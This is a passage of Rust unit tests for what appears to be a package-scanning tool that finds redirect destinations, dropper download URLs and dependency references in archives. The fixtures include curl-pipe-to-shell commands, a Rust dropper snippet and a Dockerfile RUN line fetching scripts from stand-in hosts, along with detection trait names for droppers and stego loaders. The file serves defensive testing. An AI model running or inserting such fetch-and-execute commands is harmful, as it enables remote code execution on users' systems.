        let interstitial = br#"<!DOCTYPE html><html><head>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
            </head><body><a href="/?utm_source=safety-page">Return to Safety</a>
            <input id="long_url" type=hidden value="https://stage.example.test/api/settings/linux"></input>
            <script>let longUrl = "https:\/\/stage.example.test\/api\/settings\/linux"</script>
            </body></html>"#;
        assert_eq!(
            redirect_destinations(interstitial),
            ["https://stage.example.test/api/settings/linux"]
        );

        let refresh = br#"<html><head><meta http-equiv="Refresh" content="0; URL='https://a.example.test/x?a=1&amp;b=2'"></head></html>"#;
        assert_eq!(
            redirect_destinations(refresh),
            ["https://a.example.test/x?a=1&b=2"]
        );

        let script = br#"<html><script>if (a == b) {} window.location.replace("https://b.example.test/next"); location.href = 'https://c.example.test/';</script></html>"#;
        assert_eq!(
            redirect_destinations(script),
            ["https://b.example.test/next", "https://c.example.test/"]
        );

        // Ordinary pages, relative targets, visible inputs, and non-HTML text
        // name no destination.
        for page in [
            &br#"<html><body><a href="https://d.example.test/">link</a><input type="text" name="url" value="https://e.example.test/"></body></html>"#[..],
            br#"<html><script>location = "/login";</script></html>"#,
            br#"curl -L https://f.example.test/ | sh  # <meta http-equiv=refresh content="0;url=https://g.example.test/">"#,
        ] {
            assert!(redirect_destinations(page).is_empty());
        }
    }

    #[test]
    fn redirect_destinations_are_marked_for_the_fetch_gate() {
        let page = br#"<!doctype html><input type="hidden" name="target_url" value="https://h.example.test/opaque">
            <script>let u = "https:\/\/i.example.test\/escaped"; location.assign(u);</script>
            <meta http-equiv="refresh" content="3;url=https://i.example.test/escaped">"#;
        let mut refs = vec![
            url_ref("https://h.example.test/opaque"),
            url_ref("https://j.example.test/asset.css"),
        ];
        mark_redirect_destinations(page, &mut refs);
        let sources: Vec<(String, &str)> = refs
            .iter()
            .map(|r| (locator(r).to_owned(), r.source.as_str()))
            .collect();
        assert_eq!(
            sources,
            [
                (
                    "https://h.example.test/opaque".to_string(),
                    REDIRECT_DESTINATION_SOURCE
                ),
                ("https://j.example.test/asset.css".to_string(), "test"),
                (
                    "https://i.example.test/escaped".to_string(),
                    REDIRECT_DESTINATION_SOURCE
                ),
            ]
        );
    }

    #[test]
    fn discovered_urls_need_a_domain_or_ip_host() {
        for url in ["https://example.com/stage.sh", "http://8.8.8.8/payload.bin"] {
            assert!(valid_host(url), "valid host was rejected: {url}");
        }
        for url in [
            "http://wpad/wpad.dat",
            "http://localhost/payload.bin",
            "http://%@:%u/rfc2585/%@.crl",
            "http://10.0.0.1/payload.bin",
            "http://100.64.0.1/payload.bin",
            "http://172.16.0.1/payload.bin",
            "http://192.168.1.1/payload.bin",
            "http://192.0.2.1/payload.bin",
            "http://127.0.0.1/payload.bin",
            "http://[::1]/payload.bin",
            "http://[fd00::1]/payload.bin",
            "http://[fe80::1]/payload.bin",
            "/relative/payload.bin",
            "relative/payload.bin",
        ] {
            assert!(
                !valid_host(url),
                "invalid or local host was accepted: {url}"
            );
        }
    }

    #[test]
    fn discovered_urls_with_unexpanded_templates_are_skipped() {
        for url in [
            "https://github.com/$REPO/releases/latest",
            "https://api.github.com/repos/$REPO/releases/latest",
            "https://github.com/$REPO/releases/download/v$VERSION",
            "https://github.com/$REPO.git",
            "https://bitbucket.org/${this.repositoryId}/raw/${r}/${e}",
            "https://gitlab.com/${this.repositoryId}/raw/${r}/${e}",
        ] {
            assert!(
                has_unexpanded_url_placeholder(url),
                "unexpanded template was not recognized: {url}"
            );
        }
        // Brace templates, the form a build script or Rust `format!` leaves
        // behind, are placeholders too.
        for url in [
            "https://github.com/solana-labs/solana/releases/download/v{version}/",
            "https://github.com/anza-xyz/platform-tools/releases/download/{version}/{}",
            "https://github.com/otter-sec/anchor/releases/download/v{version}/anchor-{target}{ext}",
        ] {
            assert!(
                has_unexpanded_url_placeholder(url),
                "unexpanded template was not recognized: {url}"
            );
        }
        // printf-family templates, which reach a URL through a `format!` or an
        // f-string that was never applied.
        for url in [
            "https://evil.test/download/%s/tool.tar.gz",
            "https://evil.test/releases/%(version)s/tool.tar.gz",
            "https://evil.test/v%d/tool.tar.gz",
        ] {
            assert!(
                has_unexpanded_url_placeholder(url),
                "unexpanded template was not recognized: {url}"
            );
        }
        // A real percent-escape is not a placeholder.
        for url in [
            "https://github.com/atomdrift-project/scan/releases/download/v2.8.0/atomscan",
            "https://evil.test/path%20with%20spaces/tool.tar.gz",
            "https://registry.npmjs.org/%40scope/pkg/-/pkg-1.0.0.tgz",
        ] {
            assert!(
                !has_unexpanded_url_placeholder(url),
                "a well-formed URL was rejected as a template: {url}"
            );
        }
    }

    /// A download route names the file after it. When the route word *is* the
    /// last component the URL is a listing endpoint, and fetching it costs a
    /// round trip to learn nothing.
    #[test]
    fn a_download_route_as_the_basename_is_a_listing_endpoint() {
        for url in [
            "https://api.github.com/repos/otter-sec/anchor/releases",
            "https://example.test/project/downloads",
            "https://example.test/bucket/files",
        ] {
            assert!(
                !dropper(url),
                "listing endpoint accepted as a download: {url}"
            );
        }
        assert!(dropper(
            "https://github.com/atomdrift-project/scan/releases/download/v2.8.0/atomscan"
        ));
    }

    #[test]
    fn version_shape_does_not_swallow_real_filenames() {
        // Versions — rejected as download targets.
        for v in ["0.40.0", "v2.1", "V10.0.1", "2.1"] {
            assert!(is_version_shaped(v), "version not recognized: {v}");
        }
        // Not versions: a real artifact whose name merely contains digits and
        // dots must still be fetchable. A Go module's pseudo-version filename
        // is the case that matters — mistaking it for a version stops the
        // module being fetched at all.
        for v in [
            "v0.0.0-20260823143148-1fb3b878e2fb.zip",
            "diffusers-0.0.1.tar.gz",
            "payload.exe",
            "stage-2.sh",
            "v1",
            "1",
            "lib.so.6",
            ".2.3",
            "1.2.",
            "",
        ] {
            assert!(!is_version_shaped(v), "filename misread as version: {v}");
        }
        // The versioned artifacts themselves stay fetchable end to end.
        for url in [
            "https://files.pythonhosted.org/packages/a0/05/x/diffusers-0.0.1.tar.gz",
            "https://example.test/releases/v1.2.3/payload.bin",
            "https://proxy.golang.org/github.com/o/r/@v/v0.0.0-20260823143148-1fb3b878e2fb.zip",
        ] {
            assert!(dropper(url), "versioned artifact was rejected: {url}");
        }
    }

    #[test]
    fn provenance_documents_yield_their_subject_not_their_catalogue() {
        // A forage sidecar: one artifact named by `fetch.url`, wrapped around a
        // provider response that lists every release of the project.
        let doc = serde_json::json!({
            "fetch": {"url": "https://files.example.test/pkg-1.0.tar.gz"},
            "artifact": {"sha256": "A".repeat(64), "filename": "pkg-1.0.tar.gz"},
            "registry": {
                "url": "https://files.example.test/pkg-1.0.tar.gz",
                "raw": [
                    {"url": "https://files.example.test/pkg-0.0.1.tar.gz"},
                    {"url": "https://files.example.test/pkg-0.0.2.tar.gz"}
                ]
            }
        });
        let bytes = serde_json::to_vec(&doc).expect("serialize");
        let subject = provenance_subject(&bytes).expect("subject reference");
        assert_eq!(
            subject.locator,
            RefLocator::Url("https://files.example.test/pkg-1.0.tar.gz".into()),
            "the catalogue must not supply the reference"
        );
        // The recorded digest pins the fetch.
        assert_eq!(
            subject.content_sha256.as_deref(),
            Some("a".repeat(64).as_str())
        );
        assert_eq!(subject.kind, RefKind::UrlFetch);

        // Both provenance shapes are recognized; an ordinary JSON root is not.
        assert!(is_provenance_document("json", "pkg-1.0.tar.gz.forage.json"));
        assert!(is_provenance_document(
            "registry",
            "left-pad@1.3.0.registry.json"
        ));
        assert!(!is_provenance_document("json", "package.json"));
        assert!(!is_provenance_document("json", "forage.json.txt"));

        // A document with no subject yields nothing rather than falling back to
        // the catalogue.
        let empty =
            serde_json::to_vec(&serde_json::json!({"registry": {"raw": []}})).expect("serialize");
        assert!(provenance_subject(&empty).is_none());
    }

    #[test]
    fn off_host_platform_matches_native_binary_naming() {
        let host = ("darwin", "arm64");
        // The host variant is kept; other-platform siblings are skipped.
        assert!(!off_host_platform(
            &purl_ref("pkg:npm/%40biomejs/cli-darwin-arm64@2.5.0"),
            host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:npm/%40biomejs/cli-linux-x64-musl@2.5.0"),
            host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:npm/%40biomejs/cli-win32-arm64@2.5.0"),
            host
        ));
        // Same OS, wrong arch is still off-host.
        assert!(off_host_platform(
            &purl_ref("pkg:npm/%40biomejs/cli-darwin-x64@2.5.0"),
            host
        ));
        // `<arch>-<os>` order (esbuild-style) and other scopes.
        assert!(off_host_platform(
            &purl_ref("pkg:npm/%40esbuild/linux-x64@0.21.0"),
            host
        ));
        // A portable package (no os+arch pair) is never platform-skipped.
        assert!(!off_host_platform(
            &purl_ref("pkg:npm/left-pad@1.3.0"),
            host
        ));
        assert!(!off_host_platform(&purl_ref("pkg:npm/semver@7.5.0"), host));
        // A raw URL carries no package identity to place.
        assert!(!off_host_platform(
            &url_ref("https://example.com/x.tgz"),
            host
        ));
        // Fail open when the host platform can't be named.
        assert!(!off_host_platform(
            &purl_ref("pkg:npm/%40biomejs/cli-linux-x64@2.5.0"),
            ("", "")
        ));
    }

    #[test]
    fn off_host_platform_matches_cargo_target_naming() {
        // Rust target spellings: `windows`/`i686`/`x86_64`/`aarch64`. The
        // windows-rs platform crates ship multi-megabyte import libraries that
        // no Linux host will ever link; they are the cargo analogue of npm's
        // `cli-win32-x64`.
        let host = ("linux", "x64");
        assert!(off_host_platform(
            &purl_ref("pkg:cargo/windows_i686_gnu@0.52.0"),
            host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:cargo/windows_x86_64_gnu@0.53.0"),
            host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:cargo/windows_x86_64_gnullvm@0.52.4"),
            host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:cargo/windows_aarch64_msvc@0.48.5"),
            host
        ));
        // A same-OS other-arch name still ages out on arch alone.
        assert!(off_host_platform(
            &purl_ref("pkg:npm/app-linux-aarch64@1.0.0"),
            host
        ));
        // The host's own spelling variants are kept.
        assert!(!off_host_platform(
            &purl_ref("pkg:npm/app-linux-x86_64@1.0.0"),
            host
        ));
        // musl variants are a different platform from a glibc host, wasm
        // sandbox builds never match a real host, and both directions of the
        // sharp/libvips naming are recognized.
        assert!(off_host_platform(
            &purl_ref("pkg:npm/@img/sharp-libvips-linuxmusl-x64@1.3.2"),
            host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:npm/@img/sharp-linuxmusl-arm64@0.35.3"),
            host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:npm/@img/sharp-freebsd-wasm32@0.35.3"),
            host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:npm/@img/sharp-webcontainers-wasm32@0.35.3"),
            host
        ));
        // ...while the host's real variant stays fetchable.
        assert!(!off_host_platform(
            &purl_ref("pkg:npm/@img/sharp-libvips-linux-x64@1.3.2"),
            host
        ));
        // A musl host keeps its own variants and skips the glibc one.
        let musl_host = ("linuxmusl", "x64");
        assert!(!off_host_platform(
            &purl_ref("pkg:npm/@img/sharp-linuxmusl-x64@0.35.3"),
            musl_host
        ));
        assert!(off_host_platform(
            &purl_ref("pkg:npm/@img/sharp-linux-x64@0.35.3"),
            musl_host
        ));
        // Portable cargo crates carry no os+arch pair.
        assert!(!off_host_platform(
            &purl_ref("pkg:cargo/windows@0.52.0"),
            host
        ));
        assert!(!off_host_platform(
            &purl_ref("pkg:cargo/windows-sys@0.52.0"),
            host
        ));
        assert!(!off_host_platform(&purl_ref("pkg:cargo/serde@1.0.0"), host));
    }

    #[test]
    fn versioned_purl_splits_and_exempts() {
        assert_eq!(
            versioned_purl("pkg:cargo/syn@2.0.104"),
            Some(("pkg:cargo/syn", "2.0.104"))
        );
        // npm scoped names keep their leading @ in the key.
        assert_eq!(
            versioned_purl("pkg:npm/@babel/core@7.24.0"),
            Some(("pkg:npm/@babel/core", "7.24.0"))
        );
        // No version, or a non-numeric ref, exempts the reference.
        assert_eq!(versioned_purl("pkg:npm/@scope/name"), None);
        assert_eq!(versioned_purl("pkg:cargo/serde"), None);
        assert_eq!(versioned_purl("pkg:generic/x@deadbeef"), None);
    }

    #[test]
    fn versionless_dep_superseded_only_when_coordinate_is_pinned() {
        // The lockfile pin for `puppeteer` is present in the tree.
        let pinned: HashSet<String> = ["pkg:npm/puppeteer".to_string()].into_iter().collect();

        // The manifest's version-stripped `pkg:npm/puppeteer` loses to the pin.
        assert!(superseded_by_pin(&purl_ref("pkg:npm/puppeteer"), &pinned));
        // The pin itself is kept — it is versioned, not a bare coordinate.
        assert!(!superseded_by_pin(
            &purl_ref("pkg:npm/puppeteer@10.4.2"),
            &pinned
        ));
        // A different, unpinned coordinate keeps its versionless fallback.
        assert!(!superseded_by_pin(&purl_ref("pkg:npm/left-pad"), &pinned));
        // A git/tag ref is not versionless and never equals a bare coordinate.
        assert!(!superseded_by_pin(
            &purl_ref("pkg:npm/puppeteer@dev"),
            &pinned
        ));
        // Non-PURL locators are out of scope.
        assert!(!superseded_by_pin(
            &url_ref("https://example.test/x.tgz"),
            &pinned
        ));

        // Scoped npm names: the bare scoped coordinate loses to its scoped pin.
        let scoped: HashSet<String> = ["pkg:npm/@puppeteer/browsers".to_string()]
            .into_iter()
            .collect();
        assert!(superseded_by_pin(
            &purl_ref("pkg:npm/@puppeteer/browsers"),
            &scoped
        ));
        assert!(!superseded_by_pin(
            &purl_ref("pkg:npm/@puppeteer/browsers@3.2.0"),
            &scoped
        ));
    }

    #[test]
    fn lenient_version_cmp_orders_release_schemes() {
        use std::cmp::Ordering::*;
        let cmp = lenient_version_cmp;
        assert_eq!(cmp("2.0.104", "2.0.9"), Greater);
        assert_eq!(cmp("1.2", "1.2.1"), Less);
        assert_eq!(cmp("0.52.0", "0.48.5"), Greater);
        assert_eq!(cmp("1.0.0", "1.0.0"), Equal);
        // pep440-ish and date-like schemes still order sensibly.
        assert_eq!(cmp("0.1.5rc1", "0.1.4"), Greater);
        assert_eq!(cmp("20260528.18.2", "20260101.1.1"), Greater);
        // Numeric outranks a text suffix at the same position.
        assert_eq!(cmp("1.2.3", "1.2.rc1"), Greater);
    }

    /// The fetch phase carries a wall-clock cap by default, and the two
    /// spellings that turn it off both reach the "no deadline" branch that
    /// `orchestrate` tests for.
    #[test]
    fn fetch_timeout_defaults_on_and_has_two_off_switches() {
        assert_eq!(FetchPolicy::default().max_duration, DEFAULT_FETCH_TIMEOUT);
        assert_eq!(DEFAULT_FETCH_TIMEOUT, Duration::from_secs(300));
        // A selection never disturbs the ceilings around it.
        assert_eq!(
            FetchPolicy::parse_follow("all").unwrap().max_duration,
            DEFAULT_FETCH_TIMEOUT
        );
        assert!(parse_duration("0").unwrap().is_zero());
        assert!(
            Instant::now()
                .checked_add(parse_duration("never").unwrap())
                .is_none()
        );
        assert_eq!(parse_duration("5m").unwrap(), DEFAULT_FETCH_TIMEOUT);
    }

    #[test]
    fn fetch_policy_parses_kinds_and_rejects_garbage() {
        assert_eq!(
            FetchPolicy::parse_follow("dependencies,references"),
            Ok(FetchPolicy {
                urls: true,
                packages: true,
                deps: true,
                ..FetchPolicy::default()
            })
        );
        let actions = FetchPolicy::parse_follow("ci-actions").unwrap();
        assert!(actions.ci && actions.deps);
        assert_eq!(
            FetchPolicy::parse_follow("none"),
            Ok(FetchPolicy::default())
        );
        assert!(FetchPolicy::parse_follow("deps").is_err());
        assert!(FetchPolicy::parse_follow("none,references").is_err());
    }

    /// `follow_name` inverts `parse_follow`. This is the property the header
    /// rests on: a caller files an answer under the name we return, so a name
    /// that does not parse back to the policy that produced it files the
    /// verdict under a question nobody asked.
    #[test]
    fn follow_name_round_trips_through_parse_follow() {
        for spelling in [
            "none",
            "dependencies",
            "references",
            "dependencies,references",
            "all",
        ] {
            let policy = FetchPolicy::parse_follow(spelling).unwrap();
            let name = policy
                .follow_name()
                .expect("vocabulary spelling has a name");
            assert_eq!(name, spelling, "{spelling} did not round-trip");
            assert_eq!(
                FetchPolicy::parse_follow(&name).unwrap().selection_bits(),
                policy.selection_bits(),
                "{spelling} reparsed to a different selection",
            );
        }

        // `ci-actions` implies `dependencies`, so its canonical name says so
        // rather than echoing the shorthand back.
        let actions = FetchPolicy::parse_follow("ci-actions").unwrap();
        assert_eq!(
            actions.follow_name().as_deref(),
            Some("dependencies,ci-actions")
        );
        assert_eq!(
            FetchPolicy::parse_follow("dependencies,ci-actions")
                .unwrap()
                .selection_bits(),
            actions.selection_bits(),
        );

        // The full set is spelled `all`, not enumerated, so one policy has one
        // name.
        let every = FetchPolicy::parse_follow("dependencies,references,ci-actions").unwrap();
        assert_eq!(every.follow_name().as_deref(), Some("all"));

        // A legacy alias can set half of `references`, which the customer
        // vocabulary cannot spell. Unnameable is reported, never approximated.
        let half = FetchPolicy {
            urls: true,
            packages: false,
            ..FetchPolicy::default()
        };
        assert_eq!(half.follow_name(), None);

        // Legacy CLI values remain aliases for existing scripts.
        assert_eq!(
            "deps".parse(),
            Ok(FetchPolicy {
                deps: true,
                ..FetchPolicy::default()
            })
        );
        assert_eq!(
            "packages".parse(),
            Ok(FetchPolicy {
                packages: true,
                ..FetchPolicy::default()
            })
        );
        assert_eq!(
            " urls , packages , deps ".parse(),
            Ok(FetchPolicy {
                urls: true,
                packages: true,
                deps: true,
                ..FetchPolicy::default()
            })
        );
        // `all` is shorthand for every kind, CI included.
        assert_eq!(
            "all".parse(),
            Ok(FetchPolicy {
                urls: true,
                packages: true,
                deps: true,
                ci: true,
                ..FetchPolicy::default()
            })
        );
        assert_eq!(
            "all".parse::<FetchPolicy>(),
            "urls,packages,deps,ci".parse()
        );
        // A routine `deps` fetch leaves CI off — GitHub Actions run only in CI
        // and never reach an installed artifact; `ci` (or `all`) opts in.
        assert!(!"deps".parse::<FetchPolicy>().unwrap().ci);
        assert!(!"urls,packages,deps".parse::<FetchPolicy>().unwrap().ci);
        // `ci` turns on the CI context *and* dependency fetching, since a CI
        // action is a declared dependency.
        let ci = "ci".parse::<FetchPolicy>().unwrap();
        assert!(ci.ci && ci.deps);
        // Parsing leaves depth at its default — the CLI sets it separately.
        assert_eq!(
            "deps".parse::<FetchPolicy>().unwrap().depth,
            DEFAULT_FETCH_DEPTH
        );
        assert_eq!(
            FetchPolicy::default().max_file_fetches,
            DEFAULT_MAX_FILE_FETCHES
        );
        assert_eq!(
            FetchPolicy::default().max_url_fetches,
            DEFAULT_MAX_URL_FETCHES
        );
        assert!("".parse::<FetchPolicy>().is_err());
        assert!("sigs".parse::<FetchPolicy>().is_err());
        // A truly retired vocabulary is a hard error, not a silent no-op.
        assert!("refs".parse::<FetchPolicy>().is_err());
        assert!("deps,bogus".parse::<FetchPolicy>().is_err());
        assert!(!FetchPolicy::default().enabled());

        // Selection is by kind: `packages` fetches command-mentioned packages
        // but not declared deps, and vice versa.
        let pkgs: FetchPolicy = "packages".parse().unwrap();
        assert!(pkgs.wants(RefKind::Command));
        assert!(!pkgs.wants(RefKind::Dependency));
        assert!(!pkgs.wants(RefKind::UrlFetch));
        let deps: FetchPolicy = "deps".parse().unwrap();
        assert!(deps.wants(RefKind::Dependency));
        assert!(!deps.wants(RefKind::Command));
        // Repository identity is never a fetch target.
        assert!(
            !"urls,packages,deps"
                .parse::<FetchPolicy>()
                .unwrap()
                .wants(RefKind::Repository)
        );
    }

    #[test]
    fn declared_deps_stop_at_the_first_hop_unless_transitive() {
        // Hop 0 is the artifact's own declared supply chain and is always
        // followed. Past it, declared dependencies are the transitive tail —
        // a registry lookup each, almost all of it aged out — so an interactive
        // policy drops them while the dropper kinds keep going.
        let mut policy: FetchPolicy = "all".parse().unwrap();
        assert!(!policy.transitive_deps, "interactive default");
        assert!(policy.wants_at(RefKind::Dependency, 0));
        assert!(!policy.wants_at(RefKind::Dependency, 1));
        for hop in 0..3 {
            assert!(policy.wants_at(RefKind::UrlFetch, hop), "hop {hop}");
            assert!(policy.wants_at(RefKind::Command, hop), "hop {hop}");
        }
        // A corpus-facing role takes the whole closure.
        policy.transitive_deps = true;
        assert!(policy.wants_at(RefKind::Dependency, 3));
        // The hop rule never *adds* a kind the selection left out.
        let urls: FetchPolicy = "urls".parse().unwrap();
        assert!(!urls.wants_at(RefKind::Dependency, 0));
    }

    #[test]
    fn collect_go_references_uses_owner_replacement_and_not_checksum_history() {
        let input = [
            (
                "p.zip!!go.mod",
                "module app\nrequire example.test/lib v1.0.0\nreplace example.test/lib => example.test/fork v2.0.0\n",
            ),
            (
                "p.zip!!go.sum",
                "example.test/fork v2.0.0/go.mod h1:METADATA\nexample.test/fork v2.0.0 h1:EXACT\nexample.test/lib v9.0.0 h1:HISTORY\n",
            ),
        ];
        let files: Vec<_> = input.iter().enumerate().map(|(i, (path, text))| {
            let parsed = filefacts::OpenOptions::new().path(Path::new(path.rsplit("!!").next().unwrap())).open(text.as_bytes());
            serde_json::json!({"id":i,"path":path,"depth":1,"file_type":"go_mod","sha256":format!("{i:064x}"),"size":text.len(),"filefacts":{"references":parsed.references(),"values":parsed.values()}})
        }).collect();
        let report: AnalysisReport =
            serde_json::from_value(serde_json::json!({"version":"3","files":files})).unwrap();
        let groups = collect_references(&report, Path::new("/nonexistent"), CiRefs::Skip);
        let dependencies: Vec<_> = groups
            .iter()
            .flat_map(|(_, refs)| refs)
            .filter(|r| r.kind == RefKind::Dependency)
            .collect();
        assert_eq!(dependencies.len(), 1);
        assert_eq!(
            dependencies[0].locator,
            RefLocator::Purl("pkg:golang/example.test/fork@v2.0.0".into())
        );
        assert_eq!(dependencies[0].pinned_hash.as_ref().unwrap().value, "EXACT");
    }

    #[test]
    fn collect_go_references_keeps_identical_manifests_in_distinct_workspaces() {
        let input = [
            (
                "p.zip!!one/go.work",
                "use ./app\nreplace example.test/lib => example.test/one v1.0.0\n",
            ),
            (
                "p.zip!!two/go.work",
                "use ./app\nreplace example.test/lib => example.test/two v1.0.0\n",
            ),
            (
                "p.zip!!one/app/go.mod",
                "module app\nrequire example.test/lib v1.0.0\n",
            ),
            (
                "p.zip!!two/app/go.mod",
                "module app\nrequire example.test/lib v1.0.0\n",
            ),
        ];
        let files: Vec<_> = input.iter().enumerate().map(|(i, (path, text))| {
            let parsed = filefacts::OpenOptions::new().path(Path::new(path.rsplit("!!").next().unwrap())).open(text.as_bytes());
            serde_json::json!({"id":i,"path":path,"depth":1,"file_type":"go_mod","sha256":format!("{:064x}",i.min(2)),"size":text.len(),"filefacts":{"references":parsed.references(),"values":parsed.values()}})
        }).collect();
        let report: AnalysisReport =
            serde_json::from_value(serde_json::json!({"version":"3","files":files})).unwrap();
        let groups = collect_references(&report, Path::new("/nonexistent"), CiRefs::Skip);
        let selected: HashSet<_> = groups
            .iter()
            .flat_map(|(_, refs)| refs)
            .filter(|r| r.kind == RefKind::Dependency)
            .map(|r| locator(r).to_owned())
            .collect();
        assert_eq!(
            selected,
            HashSet::from([
                "pkg:golang/example.test/one@v1.0.0".into(),
                "pkg:golang/example.test/two@v1.0.0".into()
            ])
        );
    }

    /// A zstd-compressed tar on disk holding `members`, for the member re-read
    /// path. Compressed like a real package, so the root's own text hunt sees
    /// no member text and every hunted reference comes from the member path.
    fn write_tar_zst(dir: &Path, members: &[(&str, &[u8])]) -> std::path::PathBuf {
        let path = dir.join("sample.tar.zst");
        let file = std::fs::File::create(&path).expect("create archive");
        let encoder = zstd::Encoder::new(file, 0).expect("zstd encoder");
        let mut builder = tar::Builder::new(encoder);
        for (name, body) in members {
            let mut header = tar::Header::new_ustar();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder
                .append_data(&mut header, name, *body)
                .expect("append member");
        }
        builder
            .into_inner()
            .expect("finish tar")
            .finish()
            .expect("finish zstd");
        path
    }

    const RUST_DROPPER: &[u8] = b"use std::process::{Command, Stdio};\n\
        fn run() {\n\
            let curl = Command::new(\"curl\")\n\
                .args([\"-fsSL\", \"https://stage.test/bashlinux.sh\"])\n\
                .stdout(Stdio::piped())\n\
                .spawn();\n\
        }\n";
    const README: &[u8] = b"# tool\n\
        [![Crates.io](https://img.shields.io/crates/v/tool.svg)](https://crates.io/crates/tool)\n\
        Or run `curl -fsSL https://docs.test/install.sh`.\n";

    #[test]
    fn member_with_download_intent_is_hunted_for_spawned_urls() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let root = write_tar_zst(
            tmp.path(),
            &[("pkg/src/lib.rs", RUST_DROPPER), ("pkg/README.md", README)],
        );
        let root_path = root.to_string_lossy().into_owned();
        let trigger =
            "objectives/command-and-control/dropper/execution/pipe::spawned-curl-pipe-shell-rce";
        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [
                { "id": 0, "path": root_path, "depth": 0, "file_type": "tar",
                  "sha256": "aa".repeat(32), "size": 4096u64 },
                { "id": 1, "parent_id": 0, "path": format!("{root_path}!!pkg/src/lib.rs"),
                  "depth": 1, "file_type": "rust", "sha256": "bb".repeat(32),
                  "size": RUST_DROPPER.len() as u64,
                  "findings": [
                      { "id": "micro-behaviors/process/create/system::rust-command" },
                      { "id": trigger }
                  ] },
                // Same URL shape, no download-intent finding: never re-read.
                { "id": 2, "parent_id": 0, "path": format!("{root_path}!!pkg/README.md"),
                  "depth": 1, "file_type": "markdown", "sha256": "cc".repeat(32),
                  "size": README.len() as u64 }
            ]
        }))
        .expect("report deserializes");

        let groups = collect_references(&report, &root, CiRefs::Skip);
        let hunted: Vec<(&str, String, &str)> = groups
            .iter()
            .flat_map(|(sha, refs)| {
                refs.iter()
                    .map(move |r| (sha.as_str(), locator(r).to_owned(), r.source.as_str()))
            })
            .collect();
        assert_eq!(
            hunted.len(),
            1,
            "only the flagged member is hunted: {hunted:?}"
        );
        let (sha, locator, source) = &hunted[0];
        assert_eq!(*sha, "bb".repeat(32));
        assert_eq!(locator, "https://stage.test/bashlinux.sh");
        assert!(
            !source.contains(trigger),
            "the recognizer's own source is kept, never rewritten: {source}"
        );
    }

    #[test]
    fn download_intent_prefers_the_most_specific_trait() {
        let findings: Vec<Finding> = serde_json::from_value(serde_json::json!([
            { "id": "micro-behaviors/process/create/direct::rust-command-curl-wget" },
            { "id": "micro-behaviors/process/create/shell/pipeline::curl-pipe-shell-text" },
            { "id": "objectives/command-and-control/dropper/execution/pipe::process-api-call" },
        ]))
        .expect("findings deserialize");
        assert_eq!(
            download_intent(&findings),
            Some("objectives/command-and-control/dropper/execution/pipe::process-api-call")
        );
        assert_eq!(
            download_intent(&findings[..1]),
            Some("micro-behaviors/process/create/direct::rust-command-curl-wget")
        );
        let benign: Vec<Finding> = serde_json::from_value(serde_json::json!([
            { "id": "micro-behaviors/process/create/system::rust-command" },
            { "id": "micro-behaviors/communications/http/url/path::image-file-url" },
        ]))
        .expect("findings deserialize");
        assert_eq!(download_intent(&benign), None);
    }

    #[test]
    fn image_url_is_a_carrier_only_beside_stego_evidence() {
        let url =
            |u: &str| Reference::new(RefLocator::Url(u.into()), RefKind::UrlFetch, "rust", "");
        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [
                { "id": 0, "path": "loader.rs", "depth": 0, "file_type": "rust",
                  "sha256": "aa".repeat(32), "size": 1u64,
                  "findings": [{ "id": "objectives/command-and-control/dropper/execution/stego-loader::rust-downloaded-image-range-script-loader" }] },
                { "id": 1, "path": "README.md", "depth": 1, "file_type": "markdown",
                  "sha256": "bb".repeat(32), "size": 1u64,
                  "findings": [{ "id": "micro-behaviors/communications/http/url/path::image-file-url" }] },
                { "id": 2, "path": "install.sh", "depth": 1, "file_type": "shell",
                  "sha256": "cc".repeat(32), "size": 1u64,
                  "findings": [
                      { "id": "micro-behaviors/communications/http/url/path::image-file-url" },
                      { "id": "objectives/command-and-control/dropper/execution/pipe::curl-pipe-shell" }
                  ] }
            ]
        }))
        .expect("report deserializes");
        let groups = vec![
            (
                "aa".repeat(32),
                vec![
                    url("https://stage.test/screenshot_2.png"),
                    url("https://stage.test/index.html"),
                ],
            ),
            // An image URL with no carrier evidence: a README badge.
            (
                "bb".repeat(32),
                vec![url("https://img.shields.io/crates/v/tool.PNG")],
            ),
            // An image URL beside a dropper execution trait.
            (
                "cc".repeat(32),
                vec![url("https://stage.test/cover.JPG?v=2")],
            ),
        ];
        let carriers = image_carrier_urls(&report, &groups);
        assert_eq!(
            carriers,
            HashSet::from([
                "https://stage.test/screenshot_2.png".to_string(),
                "https://stage.test/cover.JPG?v=2".to_string(),
            ])
        );
        // Carrier or not, an ordinary image URL still fails the download shape.
        assert!(!dropper("https://img.shields.io/crates/v/tool.png"));
    }

    #[test]
    fn collect_references_unions_declared_facts_and_root_hunt() {
        // Root Dockerfile on disk: its RUN curls a URL (imperative hunt) and it
        // also declares a package dependency (a filefacts fact in the report).
        let tmp = tempfile::tempdir().expect("tempdir");
        let df = tmp.path().join("Dockerfile");
        std::fs::write(
            &df,
            b"FROM alpine\nRUN curl -fsSL https://stage.test/x.sh | sh\n",
        )
        .expect("write dockerfile");
        let sha = "ab".repeat(32);
        // Minimal one-file report (FileAnalysis has no public constructor, so
        // build it by deserialization) declaring one package dependency.
        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [{
                "id": 0, "path": "root", "depth": 0, "file_type": "dockerfile",
                "sha256": sha, "size": 64u64,
                "filefacts": { "references": [{
                    "locator": {"purl": "pkg:npm/declared-dep@1.0.0"},
                    "kind": "dependency", "source": "test", "evidence": "declared", "offset": 0
                }]}
            }]
        }))
        .expect("minimal report deserializes");

        let groups = collect_references(&report, &df, CiRefs::Skip);
        assert_eq!(groups.len(), 1);
        let (gsha, refs) = &groups[0];
        assert_eq!(gsha, &sha);
        let locs: Vec<String> = refs.iter().map(|r| locator(r).to_owned()).collect();
        assert!(
